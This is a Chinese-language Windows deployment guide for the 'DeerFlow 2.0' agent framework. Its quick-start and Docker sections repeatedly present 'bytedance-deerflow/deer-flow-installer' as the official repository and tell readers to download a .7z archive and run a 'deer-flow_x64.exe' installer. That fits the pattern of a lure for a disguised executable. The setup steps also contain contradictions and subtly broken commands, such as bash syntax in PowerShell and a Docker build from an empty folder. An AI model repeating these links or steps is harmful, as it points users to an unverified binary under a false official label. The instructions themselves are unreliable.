# DeerFlow 2.0 Windows 部署方案

## 📋 概述

DeerFlow 2.0 是 ByteDance 开源的 Super Agent Harness，支持深度研究、代码生成、内容创作等复杂任务。基于 LangGraph 和 LangChain 构建，提供完整的沙箱执行环境、子代理系统和长期记忆功能。

**官方仓库**: https://github.com/bytedance-deerflow/deer-flow-installer

## 🖥️ 系统要求

| 项目 | 要求 |
|------|------|
| 操作系统 | Windows 10/11 (64-bit) |
| 内存 | 推荐 16GB+ |
| 磁盘 | 至少 10GB 可用空间 |
| 网络 | 需要访问 OpenAI API 等外部服务 |

## 🚀 快速部署（推荐方式）

### 步骤 1：下载安装包

访问官方 Releases 页面下载最新安装包：

```bash
# 直接下载链接
https://github.com/bytedance-deerflow/deer-flow-installer/releases/download/deer-flow-installer/deer-flow_x64.7z
```

### 步骤 2：解压并安装

1. 解压 `deer-flow_x64.7z` 文件
2. 运行 `deer-flow_x64.exe` 安装程序
3. 按照安装向导完成安装

### 步骤 3：启动应用

- 开始菜单中找到 **DeerFlow** 并启动
- 或在命令行运行 `deer-flow` 命令

## 🛠️ 从源码部署（高级）

### 环境准备

1. **安装 Python 3.11+**

```powershell
# 检查Python版本
python --version
```

2. **安装 Docker Desktop**

- 下载并安装 [Docker Desktop for Windows](https://www.docker.com/products/docker-desktop)
- 确保 WSL2 后端已启用
- 启动 Docker Desktop

3. **克隆项目**

```bash
git clone https://github.com/bytedance-deerflow/deer-flow-installer.git
cd deer-flow-installer
```

### 安装依赖

```bash
# 创建虚拟环境（推荐）
python -m venv venv
.\venv\Scripts\activate

# 安装依赖
pip install -r requirements.txt
```

### 配置环境变量

创建 `.env` 文件：

```bash
# 必需：LLM API配置
OPENAI_API_KEY=your_openai_api_key
OPENAI_BASE_URL=https://api.openai.com/v1  # 或其他兼容API

# 可选：模型配置
DEFAULT_MODEL=gpt-4o

# 可选：Telegram配置
TELEGRAM_BOT_TOKEN=your_telegram_bot_token

# 可选：Slack配置
SLACK_BOT_TOKEN=your_slack_bot_token
SLACK_APP_TOKEN=your_slack_app_token

# 可选：飞书配置
FEISHU_APP_ID=your_feishu_app_id
FEISHU_APP_SECRET=your_feishu_app_secret
```

### 启动服务

```bash
# 方式1：本地模式（无需Docker）
python -m deer_flow.main

# 方式2：Docker模式
docker-compose up -d

# 服务地址
# - LangGraph Server: http://localhost:2024
# - Gateway API: http://localhost:8001
```

## 📝 配置文件说明

主配置文件 `config.yaml`：

```yaml
# 服务配置
server:
  host: 0.0.0.0
  port: 2024

gateway:
  host: 0.0.0.0
  port: 8001

# 沙箱模式：local | docker | kubernetes
sandbox:
  mode: docker

# 模型配置
models:
  default:
    provider: openai
    model: gpt-4o
    temperature: 0.7

# 消息渠道配置
channels:
  telegram:
    enabled: false
    bot_token: ""
    
  slack:
    enabled: false
    bot_token: ""
    app_token: ""
    
  feishu:
    enabled: false
    app_id: ""
    app_secret: ""
```

## 🔧 技能系统

DeerFlow 使用 Skills 定义代理能力：

```
/mnt/skills/public/          # 内置技能
├── research/               # 研究技能
├── report-generation/      # 报告生成
├── slide-creation/         # 幻灯片创建
├── web-page/               # 网页生成
└── image-generation/      # 图片生成

/mnt/skills/custom/         # 自定义技能（用户添加）
```

### 添加自定义技能

1. 在 `skills/custom/` 目录下创建新技能文件夹
2. 添加 `SKILL.md` 定义技能工作流
3. 重启服务使技能生效

## 🐳 Docker 部署（推荐）

Docker 部署是 DeerFlow 2.0 推荐的生产环境部署方式，提供完整的隔离环境和便捷的运维管理。

### 方案一：使用安装包（推荐新手）

安装包已经内置了 Docker 运行环境，无需额外安装 Docker。

```bash
# 下载链接
https://github.com/bytedance-deerflow/deer-flow-installer/releases/download/deer-flow-installer/deer-flow_x64.7z
```

解压后运行 `deer-flow_x64.exe` 即可自动配置 Docker 环境。

### 方案二：手动 Docker 部署（推荐生产环境）

#### 前置要求

1. **安装 Docker Desktop for Windows**
   - 下载：[Docker Desktop](https://www.docker.com/products/docker-desktop)
   - 安装时勾选 "Use WSL 2 instead of Hyper-V"
   - 启动 Docker Desktop 并等待服务就绪

2. **检查 Docker 是否正常**
   ```powershell
   docker version
   docker ps
   ```

#### 步骤 1：创建工作目录

```powershell
# 创建部署目录
mkdir deerflow
cd deerflow

# 创建必要目录
mkdir -p data/{workspace,uploads,outputs}
```

#### 步骤 2：创建配置文件

**创建 .env 文件：**
```bash
# 必需配置
OPENAI_API_KEY=your_openai_api_key
OPENAI_BASE_URL=https://api.openai.com/v1

# 可选配置
DEFAULT_MODEL=gpt-4o
```

**创建 config.yaml 文件：**
```yaml
server:
  host: 0.0.0.0
  port: 2024

gateway:
  host: 0.0.0.0
  port: 8001

sandbox:
  mode: docker

models:
  default:
    provider: openai
    model: gpt-4o
    temperature: 0.7

channels:
  langgraph_url: http://localhost:2024
  gateway_url: http://localhost:8001
```

#### 步骤 3：创建 Dockerfile

```dockerfile
FROM python:3.11-slim

WORKDIR /app

# 安装系统依赖
RUN apt-get update && apt-get install -y \
    curl \
    git \
    && rm -rf /var/lib/apt/lists/*

# 复制项目文件
COPY . .

# 安装 Python 依赖
RUN pip install --no-cache-dir -r requirements.txt

# 暴露端口
EXPOSE 2024 8001

# 启动命令
CMD ["python", "-m", "deer_flow.main"]
```

#### 步骤 4：创建 docker-compose.yml

```yaml
version: '3.8'

services:
  # DeerFlow 主服务
  deerflow:
    image: deerflow:latest
    container_name: deerflow
    ports:
      - "2024:2024"   # LangGraph Server
      - "8001:8001"   # Gateway API
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
      - OPENAI_BASE_URL=${OPENAI_BASE_URL:-https://api.openai.com/v1}
      - DEFAULT_MODEL=${DEFAULT_MODEL:-gpt-4o}
    volumes:
      - ./data:/mnt/user-data
      - ./config.yaml:/app/config.yaml
    restart: unless-stopped
    networks:
      - deerflow-net

  # 可选：Sandbox 容器（用于隔离执行）
  sandbox:
    image: deerflow-sandbox:latest
    container_name: deerflow-sandbox
    ports:
      - "9000:9000"
    volumes:
      - ./data:/mnt/user-data
    restart: unless-stopped
    networks:
      - deerflow-net

networks:
  deerflow-net:
    driver: bridge
```

#### 步骤 5：启动服务

```powershell
# 构建镜像
docker build -t deerflow:latest .

# 启动服务
docker-compose up -d

# 查看日志
docker-compose logs -f

# 检查服务状态
docker-compose ps
```

#### 步骤 6：验证部署

服务启动后，访问以下地址验证：

- LangGraph Server: http://localhost:2024
- Gateway API: http://localhost:8001
- API 文档: http://localhost:2024/docs

```powershell
# 测试 API 是否可用
curl http://localhost:2024/health
```

### 方案三：使用预构建镜像

如果你不想自己构建镜像，可以使用社区提供的预构建镜像：

```yaml
version: '3.8'

services:
  deerflow:
    image: ghcr.io/bytedance-deerflow/deer-flow:latest
    container_name: deerflow
    ports:
      - "2024:2024"
      - "8001:8001"
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
    volumes:
      - ./data:/mnt/user-data
      - ./config.yaml:/app/config.yaml
    restart: unless-stopped
```

### 配置消息渠道（可选）

#### Telegram 配置

```bash
# .env 文件添加
TELEGRAM_BOT_TOKEN=your_bot_token
```

```yaml
# config.yaml 添加
channels:
  telegram:
    enabled: true
    bot_token: ${TELEGRAM_BOT_TOKEN}
```

#### 飞书配置

```bash
# .env 文件添加
FEISHU_APP_ID=cli_xxxxx
FEISHU_APP_SECRET=your_secret
```

```yaml
# config.yaml 添加
channels:
  feishu:
    enabled: true
    app_id: ${FEISHU_APP_ID}
    app_secret: ${FEISHU_APP_SECRET}
```

### 数据持久化

```yaml
volumes:
  # 用户数据持久化
  - ./data:/mnt/user-data
  # 配置持久化
  - ./config.yaml:/app/config.yaml
  # 技能扩展
  - ./skills:/mnt/skills/custom
```

### 常用运维命令

```powershell
# 查看日志
docker-compose logs -f deerflow

# 重启服务
docker-compose restart deerflow

# 停止服务
docker-compose down

# 更新镜像
docker-compose pull
docker-compose up -d

# 进入容器
docker exec -it deerflow bash

# 查看资源使用
docker stats deerflow
```

### 生产环境建议

1. **使用外部数据库**（可选）
   - 推荐使用 PostgreSQL 存储对话历史
   - 使用 Redis 缓存热点数据

2. **配置反向代理**
   - 使用 Nginx 反向代理到 8001 端口
   - 配置 SSL/TLS 证书

3. **监控告警**
   - 配置 Docker 健康检查
   - 使用 Prometheus + Grafana 监控

4. **资源限制**
   ```yaml
   deploy:
     resources:
       limits:
         memory: 8G
         cpus: '4.0'
   ```

## 🐛 常见问题

### Q1: 安装后无法启动？

1. 检查是否安装了 Visual C++ Redistributable
2. 确保 Docker Desktop 已启动（如果是 Docker 模式）
3. 检查 `.env` 文件中的 API Key 是否正确

### Q2: Docker 模式启动失败？

```powershell
# 检查Docker状态
docker ps

# 查看容器日志
docker logs deerflow

# 重启Docker服务
Restart-Service docker
```

### Q3: 如何更新到最新版本？

```bash
# 通过安装包更新
# 1. 下载最新安装包
# 2. 卸载旧版本
# 3. 安装新版本

# 或通过源码更新
git pull origin main
pip install -r requirements.txt
```

### Q4: 支持哪些模型？

DeerFlow 支持任何 OpenAI 兼容的 API，包括：
- OpenAI GPT-4o / GPT-4
- Anthropic Claude
- 阿里通义千问
- 字节跳动云雀
- 本地部署的 LLM（如 LM Studio）

## 📚 相关资源

- 官方文档：https://github.com/bytedance-deerflow/deer-flow-installer
- Skills 仓库：https://github.com/bytedance-deerflow/deer-flow-installer/tree/main/skills
- Releases：https://github.com/bytedance-deerflow/deer-flow-installer/releases

## 📄 附录：完整环境变量列表

```bash
# LLM 配置
OPENAI_API_KEY=your_key
OPENAI_BASE_URL=https://api.openai.com/v1
DEFAULT_MODEL=gpt-4o

# 消息渠道
TELEGRAM_BOT_TOKEN=
SLACK_BOT_TOKEN=
SLACK_APP_TOKEN=
FEISHU_APP_ID=
FEISHU_APP_SECRET=

# MCP 服务器（可选）
MCP_SERVER_URL=
MCP_SERVER_AUTH_TOKEN=

# 高级配置
RECURSION_LIMIT=100
LOG_LEVEL=INFO
```

---

*文档最后更新：2026-03-24*
